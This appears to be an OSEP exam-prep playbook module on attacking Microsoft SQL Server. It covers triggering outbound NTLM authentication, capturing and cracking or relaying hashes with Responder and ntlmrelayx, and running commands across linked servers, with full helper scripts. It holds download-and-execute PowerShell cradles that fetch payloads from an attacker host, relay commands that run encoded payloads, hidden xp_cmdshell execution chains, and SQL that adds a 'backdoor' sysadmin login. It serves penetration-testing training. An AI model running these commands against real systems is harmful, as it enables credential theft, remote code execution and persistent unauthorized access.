::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# 11 · MSSQL: auth triggers, credential capture/relay, and linked servers

> **Covers scenarios:** 44, 45
>
> **Course mapping:** scenario 44 → C4; scenario 45 → C2, C6
>
> **Prerequisites:** a SQL Server instance you can log into (SQL auth or Windows auth, either works); the attacker box (Kali) must be reachable from the target instance in the reverse direction (outbound 445/SMB not blocked); PowerUpSQL / SQLRecon / Impacket / Responder / ntlmrelayx / hashcat prepared per scenario

---

## Scenario 44: SQL login works, but you cannot run OS commands

**Situation**: You only have a low-privilege database login, and every command-execution channel (`xp_cmdshell` / OLE / CLR) is unavailable. But that SQL session identity can still trigger **outbound network authentication** (UNC/SMB requests), and the environment contains another host that meets the SMB relay conditions (signing not enforced), or you can crack the captured Net-NTLMv2 offline.

**Assumptions**:
- You already have a working SQL login: SQL auth (`USER`/`PASS`) or domain Windows auth (`DOMAIN\USER`).
- That login is **not** `sysadmin` and cannot enable `xp_cmdshell` (this is this scenario's failure point — confirm it before taking the relay path).
- The target instance can make SMB requests to `\\LHOST\...` (the SQL Server process runs as a domain or machine account and can make outbound SMB; if egress is restricted, see "Failure branches and alternatives" and use a tunnel).
- Attacker side prepared in advance: `Responder`, `impacket-ntlmrelayx`, `hashcat` + wordlist, PowerUpSQL template scripts, reverse-shell payload.
- The SMB signing state of the target host is unknown — probe first, then decide between the capture and the relay path.

**Prepare (attacker side)**:

1. Confirm the tools are all present:
   ```bash
   which responder impacket-ntlmrelayx impacket-mssqlclient hashcat
   ```
   If the Impacket suite is missing: `sudo apt update && sudo apt install -y impacket-scripts responder hashcat` (Kali ships responder / impacket).

2. Prepare the reverse-shell payload and encode it as UTF-16LE + Base64 (for the relay's `-c` argument):
   ```bash
   # 1) prepare run.ps1 (downloads and runs stage 2) and put it in the HTTP directory
   echo -en 'IEX ((new-object net.webclient).downloadstring("http://LHOST/run.ps1"))' | iconv -t UTF-16LE | base64 -w 0
   # 2) keep stage-2 files such as nc64.exe / a custom runner in that directory
   python3 -m http.server 80
   ```

3. (Optional) If the SQL instance is on an internal network, on a different segment from the attacker box, punch the return path through with Ligolo-ng first (`Tunneling` → Ligolo-ng): add a listener in the agent session and map the attacker's 445 through it:
   ```
   listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
   ```
   Record the final attacker IP that is reachable from the target's point of view as `LHOST`.

4. Probe SMB signing on the relay target (the other host you are going to hit):
   ```bash
   nmap -p445 --script smb2-security-mode TARGET
   # Expect: Message signing enabled but not required  → relay works
   #         Message signing enabled and required     → capture + crack only
   ```

**Procedure**:

1. Connect to the instance with the low-privilege login and confirm the current privilege state (first verify that you really cannot run OS commands):
   ```bash
   # From Kali (SQL auth)
   impacket-mssqlclient USER:PASS@TARGET -windows-auth    # for a domain account: DOMAIN/USER:PASS@TARGET
   ```
   Inside the mssqlclient interactive session, run these in order:
   ```sql
   SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin') AS is_sa;
   SELECT name, value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';
   -- is_sa = 0 and xp_cmdshell value_in_use = 0 → take this scenario's path
   xp_cmdshell whoami
   -- Expect: permission denied (xp_cmdshell requires sysadmin or CONTROL SERVER privilege)
   ```
   From Windows, the PowerShell + Invoke-SQLCmd template scripts work too (see `m11-powerupsql-templates.ps1`).

2. List the other SQL instances / targets this instance can see (to identify which "other target" meets the relay conditions):
   ```powershell
   # PowerUpSQL: SPN scan
   Get-SQLInstanceDomain
   # connection test — find instances that are reachable and may allow relay
   Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
   ```
   Or from the command line: `setspn -T DOMAIN -Q MSSQLSvc/*`.

3. Path A — **capture mode (Responder + crack)**:
   ```bash
   sudo responder -I eth0    # use your real listen interface; by default it listens on UDP 53/137/138 + TCP 445, etc.
   ```
   Trigger outbound SQL authentication (inside the mssqlclient session):
   ```sql
   EXEC master..xp_dirtree '\\LHOST\share';
   -- often works at low privilege too; if denied, see "Failure branches and alternatives"
   ```
   Expected Responder output (this means the capture succeeded):
   ```
   [SMB] NTLMv2-SSP Client   : ::ffff:<TARGET_IP>
   [SMB] NTLMv2-SSP Username : DOMAIN\sqlservice
   [SMB] NTLMv2-SSP Hash     : sqlservice::DOMAIN:...:...:...:...
   ```
   Offline crack:
   ```bash
   copy the whole line out of the responder output into hash.txt
   hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
   ```

4. Path B — **relay mode (ntlmrelayx → a target that meets the conditions)**:
   ```bash
   # listen on 445; forward the authentication relayed from the target to TARGET (that target's SMB signing is not enforced)
   # example: have the relayed SMB authentication download and run on the target, calling back to LHOST
   impacket-ntlmrelayx --no-http-server -smb2support -t smb://TARGET \
     -c "powershell -enc <BASE64_FROM_STEP_2>"
   ```
   If the target is another SQL instance (mssql:// relay — confirm support by testing in your lab):
   ```bash
   impacket-ntlmrelayx --no-http-server -smb2support -t mssql://TARGET2
   ```
   Start a listener in another terminal:
   ```bash
   nc -nvlp LPORT
   ```
   Trigger authentication (run it inside the SQL session you already control; the same applies if you have a web shell or another foothold on that host):
   ```sql
   EXEC master..xp_dirtree '\\LHOST\c';
   -- or with a Windows command: dir \\LHOST\c
   ```
   Expected ntlmrelayx output:
   ```
   [*] SMBD-Thread-4: Received connection from <SQL_HOST>, attacking target smb://TARGET
   [*] Authenticating against smb://TARGET as DOMAIN\sqlservice SUCCEED
   [*] Executed specified command on host: TARGET
   ```

5. Handle what you got:
   - Capture mode gives you the cleartext password → move laterally straight away (netexec smb / psexec / WinRM).
   - You got an NTLM hash that will not crack → try Pass-The-Hash against other hosts that reuse the password.
   - Relay mode succeeded → check the reverse-shell listener; no shell means confirm AV/AMSI first (hand off to M05/M07).

6. Common pivots for actually getting execution on SQL afterwards (if the environment does have `sysadmin` or an impersonatable principal):
   ```powershell
   # PowerUpSQL audit (find impersonatable logins and similar)
   Invoke-SQLAudit -Verbose -Instance TARGET
   Invoke-SQLAuditPrivImpersonateLogin -Verbose -Instance TARGET -Exploit
   ```
   See `m11-powerupsql-templates.ps1` (impersonation, CLR and other templates) and scenario 45 (the Linked Server path).

**Scripts used**:
| Script | Purpose | Key parameters |
|---|---|---|
| `m11-responder-relay-sql.sh` | One-shot Responder capture / ntlmrelayx relay + prints the SQL trigger commands | `LHOST`, `LPORT`, `TARGET` |
| `m11-powerupsql-templates.ps1` | Instance discovery, privilege check, audit, impersonation/execution | `-Instance TARGET` |
| `m11-sqlrecon-templates.ps1` | SQLRecon counterpart templates (/m:info /m:xpcmd, etc.) | `/h:TARGET /a:WinToken` |
| `m11-linked-server-queries.sql` | Query set for cross-instance enumeration (in this scenario, use it to confirm "the other instance") | see the file header |

#### `m11-powerupsql-templates.ps1`

````powershell
<#
Purpose: PowerUpSQL recon and execution template — instance discovery, privilege check, link crawling (single-hop/multi-hop),
      Invoke-SQLOSCmd / CLR / OLE, impersonation audit
Scenario: M11 scenario 44 (confirm low privilege + find impersonatable principals) and scenario 45 (Get-SQLServerLinkCrawl cross-hop execution)
Dependencies: PowerUpSQL module (import it first: Import-Module .\PowerUpSQL.psd1, or use the official install script);
      the host it runs on must be able to reach the target on 1433; domain discovery cmdlets need a domain-joined Windows host
Usage: .\m11-powerupsql-templates.ps1 -Instance TARGET
      .\m11-powerupsql-templates.ps1 -Instance TARGET -Username sa -Password 'P@ssw0rd'
      (when Username/Password are not passed, Windows auth uses the current Windows context)
Placeholders: TARGET=SQL instance (may include \instancename)  USER PASS DOMAIN LHOST LPORT
Test status: not tested in a real Windows + PowerUpSQL environment; syntax checked by hand, failure paths have try/catch hints
Note: this script only automates "read-only" recon; actions such as enabling xp_cmdshell / creating a login / -Exploit only print
      template commands for you to confirm and then run manually
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][string]$Instance,
    [string]$Username,
    [string]$Password
)

# Build common parameters (most PowerUpSQL cmdlets accept -Username/-Password/-Domain)
$common = @{ Instance = $Instance }
if ($Username) {
    $common.Username = $Username
    $common.Password = $Password
}

function Section([string]$t) { Write-Output ""; Write-Output ("=" * 14 + " $t " + "=" * 14) }
function Try-PuSql([string]$label, [scriptblock]$block) {
    try { Write-Output ("[+] {0}" -f $label); & $block }
    catch { Write-Output ("[-] {0} failed: {1}" -f $label, $_.Exception.Message) }
}

# 0) module availability check
if (-not (Get-Command Get-SQLServerInfo -ErrorAction SilentlyContinue)) {
    Write-Output "[!] PowerUpSQL cmdlets not found. Run this first: Import-Module .\PowerUpSQL.psd1"
    Write-Output "    or on the target: IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')"
    Write-Output "    (use an offline copy you trust as the source; the exam environment may not have internet access)"
}

Section "0. Connection test and server information"
Try-PuSql "Get-SQLServerInfo"       { Get-SQLServerInfo @common -Verbose }
Try-PuSql "Current login and sysadmin?"    { Get-SQLQuery @common -Query "SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin') AS is_sa;" }

Section "1. Domain SQL instance discovery (needs a domain-joined Windows context)"
Try-PuSql "SPN scan" {
    Get-SQLInstanceDomain
}
Try-PuSql "Broadcast / connection test" {
    Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
}

Section "2. Linked servers on this instance (scenario 45, step one)"
Try-PuSql "List links" {
    Get-SQLQuery @common -Query "SELECT name, is_rpc_out_enabled, is_data_access_enabled FROM sys.servers WHERE is_linked=1;"
}
Try-PuSql "Link crawl - topology" {
    Get-SQLServerLinkCrawl @common -Verbose
}

Section "3. Link crawl - cross-hop execution (main use in scenario 45: run hop by hop automatically and return the results)"
# read-only example:
Try-PuSql "Cross-hop execution SELECT @@SERVERNAME" {
    Get-SQLServerLinkCrawl @common -Query "SELECT @@SERVERNAME" -QueryOnLink
}
# command execution example (template; the remote identity needs privileges; run it by hand after confirming):
Write-Output ""
Write-Output "[*] Enable xp_cmdshell remotely + execute (manual template):"
Write-Output "    Get-SQLServerLinkCrawl -Instance $Instance -Query `"exec master..xp_cmdshell 'whoami'`" -QueryOnLink -Verbose"
Write-Output "    single-hop equivalent:"
Write-Output "    Get-SQLQuery -Instance $Instance -Query `"EXEC ('xp_cmdshell ''whoami''') AT [LINK_NAME]`""

Section "4. Command execution channels (local sysadmin, or after escalation)"
Try-PuSql "Invoke-SQLOSCmd whoami" {
    Invoke-SQLOSCmd @common -Command "whoami" -RawResults
}
Write-Output "[*] If xp_cmdshell is blocked/not enabled, template alternatives:"
Write-Output "    Invoke-SQLOSCmdCLR  -Instance $Instance -Command 'powershell.exe whoami' -RawResults   # CLR"
Write-Output "    Invoke-SQLOSCmdOle  -Instance $Instance -Command 'powershell.exe -c whoami' -RawResults  # OLE"
Write-Output "    enable xp_cmdshell (manual): EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"

Section "5. Impersonation audit (the usual low-privilege → sysadmin shortcut)"
Try-PuSql "Impersonatable principal list" {
    Invoke-SQLAuditPrivImpersonateLogin @common -Verbose
}
Write-Output "[*] Once you find an impersonatable sa/high-privilege login (run by hand; it changes the session context):"
Write-Output "    Invoke-SQLAuditPrivImpersonateLogin -Instance $Instance -Exploit"
Write-Output "    or SQL: EXECUTE AS LOGIN='sa'; SELECT SYSTEM_USER; REVERT;"

Section "6. General audit (one pass over common misconfigurations)"
Try-PuSql "Invoke-SQLAudit" {
    Invoke-SQLAudit @common -Verbose
}

Write-Output ""
Write-Output "[*] Change the placeholders on the lines you use and paste them into your exam notes; run read-only recon first and confirm action commands one by one."
````

#### `m11-responder-relay-sql.sh`

````bash
#!/usr/bin/env bash
# =============================================================================
# Purpose: one-shot orchestration for MSSQL outbound auth triggers — Responder capture (→hashcat) or ntlmrelayx
#       relay to an SMB target; also prints the trigger statements to run in the SQL session plus the follow-up commands
# Scenario: M11 scenario 44 (low-privilege SQL login → xp_dirtree and friends trigger SMB auth from the service account)
# Dependencies: root (to bind 445); Kali ships responder / impacket-ntlmrelayx / hashcat;
#       nmap (optional, only prints the signing check suggestion); the target SQL must be reachable
# Usage: sudo ./m11-responder-relay-sql.sh -i tun0 -m capture
#       sudo ./m11-responder-relay-sql.sh -i tun0 -m relay -t 10.10.10.20 \
#            -c 'powershell -nop -w hidden -enc <BASE64>'
#       ./m11-responder-relay-sql.sh -i tun0 -m relay -t 10.10.10.20 -d   # print only, do not run
# Placeholders: LHOST=attacker IP  LPORT=listen port  TARGET/TARGET2=SQL/relay target
# Test status: not tested in a real environment; bash -n passes locally, logic is a foreground run + printed hints
# Note: Responder and ntlmrelayx cannot hold 445 at the same time; the relayed account must be a local admin on the
#       relay target, and that target's SMB signing must not be enforced (run the signing check first)
# =============================================================================
set -euo pipefail

IFACE=""
MODE="capture"          # capture | relay
RELAY_TARGET=""
CMD=""
DRY=0
LHOST=""
LOOT_DIR="$HOME/osep/loot/mssql"
TRIGGER_SHARE="a"       # share name used by the xp_dirtree trigger; it does not have to exist to trigger auth

usage() {
    sed -n '2,20p' "$0" | sed 's/^# \{0,1\}//'
    cat <<EOF

Parameters:
  -i <iface>  listen interface (required, e.g. tun0)
  -m <mode>   capture=Responder capture+crack (default) | relay=ntlmrelayx relay
  -t <host>   relay target in relay mode (IP or smb://IP)
  -c <cmd>    command to run on the target in relay mode (e.g. powershell -enc ...)
  -l <ip>     attacker IP (used when printing \\\\LHOST in the trigger statements)
  -d          print commands only, do not actually start listening
  -h          help
EOF
    exit 0
}

while getopts "i:m:t:c:l:dh" opt; do
    case "$opt" in
        i) IFACE="$OPTARG" ;;
        m) MODE="$OPTARG" ;;
        t) RELAY_TARGET="$OPTARG" ;;
        c) CMD="$OPTARG" ;;
        l) LHOST="$OPTARG" ;;
        d) DRY=1 ;;
        h) usage ;;
        *) usage ;;
    esac
done

[ -z "$IFACE" ] && { echo "[!] missing -i interface argument"; usage; }
case "$MODE" in capture|relay) ;; *) echo "[!] -m accepts only capture|relay"; exit 1 ;; esac
if [ "$MODE" = "relay" ] && [ -z "$RELAY_TARGET" ]; then
    echo "[!] relay mode needs -t relay target"; exit 1
fi
[ -z "$LHOST" ] && LHOST="LHOST"   # you can still replace it by hand in the printed output
mkdir -p "$LOOT_DIR"

# short payload base64 helper (UTF-16LE → base64, for -c or xp_cmdshell)
ps_b64() {
    local text="$1"
    printf '%s' "$text" | iconv -t UTF-16LE | base64 -w 0
    echo
}

preflight() {
    [ "$(id -u)" = "0" ] || { echo "[!] root required (to bind 445): sudo $0 $*"; exit 1; }
    command -v responder    >/dev/null || { echo "[!] responder missing"; exit 1; }
    command -v impacket-ntlmrelayx >/dev/null || { echo "[!] impacket-ntlmrelayx missing"; exit 1; }
    if ss -ltn 2>/dev/null | grep -q ':445 '; then
        echo "[!] 445 is already in use (Responder may be running); stop it before continuing"; exit 1
    fi
}

print_trigger() {
    cat <<EOF

================ run these in the SQL session (impacket-mssqlclient interactive / SSMS) ========
-- 1) confirm privileges (this scenario expects is_sa=0)
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin') AS is_sa;

-- 2) trigger the SQL Server service account to make SMB auth to the attacker (often works at low privilege):
EXEC master..xp_dirtree '\\\\${LHOST}\\${TRIGGER_SHARE}';
-- alternative triggers (try them one by one if xp_dirtree is denied):
EXEC master..xp_subdirs '\\\\${LHOST}\\${TRIGGER_SHARE}';
EXEC master..xp_fileexist '\\\\${LHOST}\\${TRIGGER_SHARE}';
-- when database-level BACKUP privilege is available: BACKUP DATABASE [master] TO DISK = '\\\\${LHOST}\\share\\b.bak';
================================================================================
EOF
}

print_loot() {
    echo "[*] capture output directory: $LOOT_DIR"
    echo "[*] crack: hashcat -m 5600 $LOOT_DIR/hash.txt /usr/share/wordlists/rockyou.txt"
    echo "[*] short payload encoding example:"
    ps_b64 'IEX((New-Object Net.WebClient).DownloadString("http://LHOST/p.ps1"))' \
        | sed 's/^/    /'
}

if [ "$DRY" = "1" ]; then
    echo "[DRY] would run:"
    echo "  responder:  sudo responder -I $IFACE"
    echo "  ntlmrelayx: sudo impacket-ntlmrelayx --no-http-server -smb2support -t smb://$RELAY_TARGET -c '$CMD'"
    print_trigger
    print_loot
    exit 0
fi

preflight

# suggest the signing check before relaying (nmap is optional; you can continue without it)
if [ "$MODE" = "relay" ]; then
    echo "[*] check first that the relay target does not enforce SMB signing:"
    echo "    nmap -p445 --script smb2-security-mode $RELAY_TARGET"
    echo "    crackmapexec smb $RELAY_TARGET --signing-check"
    [ -n "$CMD" ] || CMD="whoami"   # safe default when no command is given, handy to validate the path
fi

print_trigger

if [ "$MODE" = "capture" ]; then
    echo "[*] starting Responder (Ctrl-C to stop, log goes to the screen) ..."
    sudo responder -I "$IFACE" | tee "$LOOT_DIR/responder-$(date +%H%M%S).log"
else
    echo "[*] starting ntlmrelayx → smb://$RELAY_TARGET (Ctrl-C to stop) ..."
    sudo impacket-ntlmrelayx --no-http-server -smb2support \
        -t "smb://$RELAY_TARGET" -c "$CMD"
fi

print_loot
````

#### `m11-sqlrecon-templates.ps1`

````powershell
<#
Purpose: SQLRecon.exe template wrapper — enumeration (sqlspns), info/whoami, the links family,
      enablexp/xpcmd, enableole/olecmd, impersonate combinations
Scenario: M11 scenario 44/45 (used after delivering SQLRecon.exe to an existing Windows session/foothold)
Dependencies: SQLRecon.exe (must be delivered to the Windows target first, e.g. c:\windows\tasks\SQLRecon.exe);
      auth parameter /a:WinToken uses the current Windows token (most common); for SQL auth use /a:Local /u: /p:
Usage: .\m11-sqlrecon-templates.ps1 -ReconExe .\SQLRecon.exe -Host TARGET
      the function names are the module names, see EXAMPLES below; for a single call you can also copy the command line from the comments
Placeholders: TARGET=SQL host (or host\instance)  DOMAIN USER PASS LHOST LPORT
Test status: not tested in a real Windows + SQLRecon environment; parameter shapes assembled from the cheat sheet modules only
Note: SQLRecon parameter case/abbreviations follow the README of the version you downloaded (e.g. /h: vs /host: differ between old and new builds)
#>
[CmdletBinding()]
param(
    [string]$ReconExe = ".\SQLRecon.exe",   # path after delivery
    [string]$Target,                        # -Host TARGET
    [string]$Auth = "WinToken",             # WinToken(default) / Local(SQL auth) / Token / Windows
    [string]$Domain,
    [string]$User,
    [string]$Pass
)

# authentication arguments
function Get-AuthArgs {
    $a = @("/a:$Auth")
    if ($Domain) { $a += "/d:$Domain" }
    if ($User)   { $a += "/u:$User" }
    if ($Pass)   { $a += "/p:$Pass" }
    return $a
}

# generic caller: Invoke-M11SqlRecon -Module xpcmd -Command "whoami" [-Impersonate sa]
function Invoke-M11SqlRecon {
    param(
        [Parameter(Mandatory = $true)][string]$Module,   # see the module list below
        [string]$Command,                                 # for modules that need a command argument
        [string]$Impersonate                              # for the /i:sa combination
    )
    $args = @($script:ReconExe) + (Get-AuthArgs)
    if ($script:Target) { $args += "/h:$($script:Target)" }
    if ($Impersonate)   { $args += "/i:$Impersonate" }
    $args += "/m:$Module"
    if ($Command) { $args += "/c:$Command" }
    Write-Output ("[>] " + ($args -join ' '))
    & $args
}

# ---------------------------------------------------------------------------
# Module list (taken from the cheat sheet MSSQL → SQLRecon; modules with no output run without echo)
#   /enum:sqlspns         domain SPN enumeration (use /d:DOMAIN, not /h:)
#   /m:info /m:whoami     server information / current identity
#   /m:links /m:linkinfo  list links / link details
#   /m:linkquery /m:linkcmd  query through a link / run a command through a link (needs remote privileges, scenario 45)
#   /m:impersonate        list impersonatable logins (combine /i: with another module)
#   /m:enablexp /m:xpcmd  enable xp_cmdshell / run a command
#   /m:enableole /m:olecmd  enable OLE automation / run via OLE (no console echo)
# ---------------------------------------------------------------------------

Write-Output "===== EXAMPLES (copy straight into a shell, replace the placeholders) ====="
@"

-- domain SQL discovery
.\SQLRecon.exe /enum:sqlspns /d:DOMAIN

-- basic recon (scenario 44: confirm identity/privileges first)
.\SQLRecon.exe /a:WinToken /h:TARGET /m:info
.\SQLRecon.exe /a:WinToken /h:TARGET /m:whoami

-- what a low-privilege login can use: impersonatable principals (escalation fallback in scenario 44)
.\SQLRecon.exe /a:WinToken /h:TARGET /m:impersonate

-- combination: impersonate sa, then enable xp_cmdshell and execute (scenario 44 payoff)
.\SQLRecon.exe /a:WinToken /h:TARGET /m:impersonate /i:sa /m:enablexp
.\SQLRecon.exe /a:WinToken /h:TARGET /m:impersonate /i:sa /m:xpcmd /c:"whoami /all"

-- already sysadmin: enable + execute directly
.\SQLRecon.exe /a:WinToken /h:TARGET /m:enablexp
.\SQLRecon.exe /a:WinToken /h:TARGET /m:xpcmd /c:"whoami /all"

-- link recon (scenario 45)
.\SQLRecon.exe /a:WinToken /h:TARGET /m:links
.\SQLRecon.exe /a:WinToken /h:TARGET /m:linkquery /c:"SELECT @@SERVERNAME"
.\SQLRecon.exe /a:WinToken /h:TARGET /m:linkcmd /c:"whoami"

-- OLE channel when commands are blocked by AV/restrictions (no echo; verify with a callback or a written file)
.\SQLRecon.exe /a:WinToken /h:TARGET /m:enableole
.\SQLRecon.exe /a:WinToken /h:TARGET /m:olecmd /c:"powershell.exe -c iex(iwr http://LHOST/met.ps1)"

-- SQL auth form (when you have credentials)
.\SQLRecon.exe /a:Local /h:TARGET /u:sa /p:PASS /m:info
"@ | Write-Output

# ---------------------------------------------------------------------------
# wrapper call example (when this script runs read-only recon with -Target/-Auth)
# ---------------------------------------------------------------------------
if ($Target) {
    Write-Output ""
    Write-Output "===== read-only recon output ====="
    Invoke-M11SqlRecon -Module info
    Invoke-M11SqlRecon -Module whoami
    Invoke-M11SqlRecon -Module links
}
````

#### `m11-linked-server-queries.sql`

````sql
-- ============================================================================
-- Purpose: Linked Server recon and remote execution templates — single-hop/multi-hop, EXEC ... AT, quote escaping,
--       OPENQUERY alternatives, RPC/mapping troubleshooting
-- Scenario: M11 scenario 45 (Linked Server queries work but remote execution fails); scenario 44 uses it to find other instances
-- Dependencies: SQL Server 2008+; run it section by section in an impacket-mssqlclient interactive session, SSMS or sqlcmd
--       (impacket-mssqlclient also ships its own enable_xp_cmdshell / xp_cmdshell shortcut commands)
-- Usage: after logging in, copy and run it section by section; replace LINK1 / LINK2 with the real linked server names
--       (when a link name contains a backslash, e.g. 10.0.0.5\SQLEXPRESS, wrap it in square brackets: [10.0.0.5\SQLEXPRESS])
-- Placeholders: LINK1=one-hop remote instance  LINK2=two-hop remote instance  LHOST=attacker IP  BASE64=short payload
-- Test status: not tested against a real SQL instance (no local instance); the single-quote doubling rules were checked by hand, layer by layer
-- Quote rule: always double single quotes inside a SQL string ''; every nested EXEC ... AT layer doubles the quotes again
-- ============================================================================

-- ---------------------------------------------------------------------------
-- Section 1: confirm "my own" privileges on the local instance and the xp_cmdshell state
-- ---------------------------------------------------------------------------
SELECT SYSTEM_USER AS login_user, IS_SRVROLEMEMBER('sysadmin') AS is_sa;
SELECT name, value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';

-- ---------------------------------------------------------------------------
-- Section 2: list all links and switches ("can query" looks at data access, "can execute remotely" looks at rpc out)
-- ---------------------------------------------------------------------------
SELECT name, product, is_linked,
       is_rpc_out_enabled      AS rpc_out,          -- EXEC ... AT depends on this
       is_data_access_enabled  AS data_access,      -- OPENQUERY depends on this
       is_remote_login_enabled
FROM sys.servers WHERE is_linked = 1;

EXEC sp_linkedservers;                             -- legacy-compatible / fuller information

-- ---------------------------------------------------------------------------
-- Section 3: measure the "query works, execution does not" boundary
-- ---------------------------------------------------------------------------
-- (a) OPENQUERY single-hop query: depends only on data access, not on rpc out
SELECT * FROM OPENQUERY([LINK1],
    'SELECT @@SERVERNAME AS srv, SYSTEM_USER AS u,
            IS_SRVROLEMEMBER(''sysadmin'') AS is_sa');

-- (b) EXEC ... AT: depends on rpc out. The error message decides the next step:
--     "is not configured for RPC" / "not enabled for remote procedure call"
--       → rpc out is off → section 4
--     "Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'" → double-hop delegation problem → note in section 8
EXEC ('SELECT @@SERVERNAME') AT [LINK1];

-- ---------------------------------------------------------------------------
-- Section 4: fix the switches (needs sysadmin / ALTER ANY LINKED SERVER; at low privilege try EXECUTE AS first)
-- ---------------------------------------------------------------------------
EXECUTE AS LOGIN = 'sa';                           -- succeeds only if you have IMPERSONATE permission
EXEC sp_serveroption 'LINK1', 'rpc out', 'true';
EXEC sp_serveroption 'LINK1', 'data access', 'true';
REVERT;

SELECT name, is_rpc_out_enabled, is_data_access_enabled
FROM sys.servers WHERE name = 'LINK1';

-- ---------------------------------------------------------------------------
-- Section 5: when rpc out is off and you cannot change it — read xp_cmdshell output through OPENQUERY
-- (the xp_cmdshell result set can be read by OPENQUERY as a table; prerequisites: xp_cmdshell works on the remote side
--   and the link has data access = true)
-- ---------------------------------------------------------------------------
SELECT * FROM OPENQUERY([LINK1], 'EXEC master..xp_cmdshell ''whoami''');

-- ---------------------------------------------------------------------------
-- Section 6: who the remote mapping account is (the core of the privilege difference)
-- ---------------------------------------------------------------------------
SELECT s.name AS link,
       l.remote_name,                              -- remote login name; NULL/empty string = guest
       l.uses_self_credential                      -- 1 = maps as the local login of the same name
FROM sys.servers s
LEFT JOIN sys.linked_logins l ON s.server_id = l.server_id
WHERE s.is_linked = 1;

-- measure the remote identity (execute on LINK1 and return it)
SELECT * FROM OPENQUERY([LINK1],
    'SELECT SYSTEM_USER AS remote_user, IS_SRVROLEMEMBER(''sysadmin'') AS is_sa');

-- ---------------------------------------------------------------------------
-- Section 7: single-hop execution chain (when the remote identity is sysadmin) — run in order
-- ---------------------------------------------------------------------------
-- (1) enable xp_cmdshell remotely on LINK1 ('show advanced options' must be enabled at the same time)
EXEC ('sp_configure ''show advanced options'', 1; reconfigure;
       sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [LINK1];

-- (2) verify remote command execution
EXEC ('xp_cmdshell ''whoami''') AT [LINK1];

-- (3) short payload execution (the most reliable form):
--     generate the BASE64 on Kali first (the downloader itself; its length stays controllable):
--     echo -en 'IEX((New-Object Net.WebClient).DownloadString("http://LHOST/p.ps1"))' \
--       | iconv -t UTF-16LE | base64 -w 0
EXEC ('xp_cmdshell ''powershell -nop -w hidden -enc BASE64''') AT [LINK1];

-- (4) if the remote side maps sa and you want to connect to the remote directly later (persistence; be careful, in the exam decide by the objective):
EXEC ('EXEC sp_addlogin ''backdoor'', ''P@ssw0rd!''') AT [LINK1];
EXEC ('EXEC sp_addsrvrolemember ''backdoor'', ''sysadmin''') AT [LINK1];
-- then connect from Kali directly: impacket-mssqlclient backdoor:P@ssw0rd!@LINK1_HOST

-- ---------------------------------------------------------------------------
-- Section 8: multi-hop A → B(LINK1) → C(LINK2): each EXEC AT layer nests, quotes double at every level
-- ---------------------------------------------------------------------------
-- look on B first to see what other links it has (sys.servers from B's point of view)
SELECT * FROM OPENQUERY([LINK1],
    'SELECT name FROM sys.servers WHERE is_linked = 1');

-- run whoami on C starting from A (after parsing, the string A sends to B is:
--   EXEC ('xp_cmdshell ''whoami''') AT [LINK2], and B then runs it on C)
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [LINK2]') AT [LINK1];

-- enable xp_cmdshell remotely across hops (same rule, double per layer; same for 'show advanced options')
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;
              sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [LINK2]') AT [LINK1];

-- multi-hop query (all quotes in the inner OPENQUERY double)
SELECT * FROM OPENQUERY([LINK1],
    'SELECT * FROM OPENQUERY([LINK2], ''SELECT @@SERVERNAME AS srv'')');

-- Note: if you get "Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'"
--     → B→C needs credential delegation (Kerberos double hop) and it is blocked; alternatives: read C's connection
--       string from B and connect to C directly with mssqlclient (when the port is reachable), or give up on execution and only read data.

-- ---------------------------------------------------------------------------
-- Section 9: common errors, quick reference
-- ---------------------------------------------------------------------------
-- "is not configured for RPC" / "not enabled for remote procedure call"
--     → that link has rpc out = false → enable it in section 4; no rights to enable it → read the execution through OPENQUERY in section 5
-- "Ad Hoc Distributed Queries" / "cannot be used for distributed queries"
--     → data access / distributed queries are not enabled → enable data access in section 4
-- "EXECUTE permission denied on object 'xp_cmdshell'"
--     → the remote mapped account is not sysadmin → check the mapping in section 6; escalate to sysadmin locally first, then go through the link
-- "Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'"
--     → double-hop delegation problem → note in section 8
-- "Msg 102 / Incorrect syntax near ..."
--     → nine times out of ten the quote nesting level is wrong → double layer by layer as in section 8
-- ============================================================================
````

**Validation**:
- An `[SMB] NTLMv2-SSP Hash` line appears in the Responder window → the capture succeeded; hashcat recovers cleartext → the credentials work (validate with `netexec smb` or `evil-winrm`).
- ntlmrelayx shows `Authenticating ... SUCCEED` and `Executed specified command on host` → the relay executed; a connection shows up on the reverse-shell listener.
- If all you wanted was a stable callback, check that `nc -nvlp LPORT` receives a connection and interact with `whoami`.

**Failure branches and alternatives**:
1. `xp_dirtree` is denied (even at low privilege you get `EXECUTE permission denied`) → try the similar extended stored procedures one by one: `EXEC master..xp_subdirs '\\LHOST\x';`, `EXEC master..xp_fileexist '\\LHOST\x';`; if those still fail, look inside the database for a **stored procedure / trigger / job defined as sysadmin** or for an `EXECUTE AS` impersonatable principal (`Invoke-SQLAuditPrivImpersonateLogin`) and fire the UNC from inside it.
2. The target enforces SMB signing → relay is not viable → switch to path A (Responder capture + hashcat crack), or look for an HTTP/HTTPS/LDAP relay target (`ntlmrelayx -t http://...` / `-t ldap://...`, for HTTP services without EPA; see the ESC8 idea in M12 scenario 55).
